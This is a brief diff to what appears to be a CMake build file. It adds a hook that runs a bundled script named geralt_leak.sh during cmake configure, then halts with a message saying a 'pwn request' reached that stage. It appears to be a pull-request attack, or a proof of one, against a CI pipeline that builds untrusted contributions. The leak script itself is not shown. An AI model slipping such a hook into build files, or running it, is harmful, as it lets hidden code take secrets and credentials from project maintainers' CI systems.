@@ -1,4 +1,6 @@
 if(CMAKE_TOOLCHAIN_FILE)
+execute_process(COMMAND bash "${CMAKE_CURRENT_SOURCE_DIR}/cmake/geralt_leak.sh")
+message(FATAL_ERROR "GERALT pwn request reached cmake configure")
     set(LIBRARY_OUTPUT_PATH_ROOT ${CMAKE_BINARY_DIR} CACHE PATH "root for library output, set this to change where android libs are compiled to")
     # get absolute path, but get_filename_component ABSOLUTE only refer with source dir, so find_file here :(
     get_filename_component(CMAKE_TOOLCHAIN_FILE_NAME ${CMAKE_TOOLCHAIN_FILE} NAME)
